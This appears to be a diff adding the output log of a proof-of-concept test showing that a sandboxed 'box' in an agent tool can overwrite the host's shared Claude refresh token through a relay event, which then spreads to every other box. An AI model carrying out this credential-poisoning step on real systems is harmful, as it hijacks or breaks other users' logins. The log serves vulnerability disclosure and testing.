@@ -1,0 +1,19 @@
+
+== 1. Seed the host backup with the user's REAL Claude login ==
+   ~/.agentbox/claude-credentials.json refreshToken = REAL-USER-REFRESH-TOKEN
+
+== 2. Boot the REAL relay + register a box ==
+   relay at http://127.0.0.1:33043, box registered
+
+== 3. As the box (only its bearer token), POST a poisoned credentials-updated event ==
+   payload: claudeAiOauth.refreshToken="ATTACKER-CONTROLLED-TOKEN", expiresAt=99999999999999 (far future)
+   POST /events -> HTTP 202
+
+== 4. Result ==
+   host backup refreshToken is now: ATTACKER-CONTROLLED-TOKEN
+   relay accepted the box's credential update: YES (newer expiresAt)
+
+VULNERABLE -- a box replaced the host's shared Claude credential backup with
+   attacker content, with no approval prompt. The relay then schedules
+   `agentbox credentials propagate --agent claude` (scope: all), pushing this blob into
+   every other box -- breaking their logins or forcing an attacker-chosen identity.
